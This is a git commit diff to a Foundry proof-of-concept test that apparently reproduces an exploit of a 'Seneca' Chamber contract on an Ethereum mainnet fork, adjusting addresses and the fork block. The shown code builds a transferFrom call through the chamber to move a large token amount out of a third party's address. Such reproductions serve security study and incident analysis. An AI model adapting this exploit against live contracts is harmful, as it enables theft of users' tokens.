246d6e3057f47f59904681ac5fe2296d31cb285e
Ciara Nightingale <ciara.nightingale@sky.com>
2024-03-04 10:51:51 +0000

    working test

--- test/poc.t.sol
+++ test/poc.t.sol
@@ -7,10 +7,10 @@ import {IERC20} from "openzeppelin-contracts/contracts/interfaces/IERC20.sol";
 
 contract SenecaPoC is Test {
     IERC20 constant resETH = IERC20(0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E);
-    IChamber constant CHAMBER = IChamber(0xBC83F2711D0749D7454e4A9D53d8594DF0377c05);
+    IChamber constant CHAMBER = IChamber(0x65c210c59B43EB68112b7a4f75C8393C36491F06);
 
     function setUp() public {
-        vm.createSelectFork("eth", 19325937);
+        vm.createSelectFork("eth", 19325936);
         //vm.etch(address(MARKETS_IMPL), address(deployCode('MarketsView.sol')).code);
         vm.label(address(CHAMBER), "Chamber");
     }
@@ -30,7 +30,7 @@ contract SenecaPoC is Test {
         // specify that the chamber contract calls tranferFrom
         bytes memory callData;
         callData = abi.encodeWithSignature("transferFrom(address,address,uint256)", 0x9CBF099ff424979439dFBa03F00B5961784c06ce, 0x94641c01a4937f2C8eF930580cF396142a2942DC, 1385238431763437306795);
-        address callee = 0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E;
+        address callee = address(resETH);
         bool useValue1 = false;
         bool useValue2 = false;
         uint8 returnValues = 0;
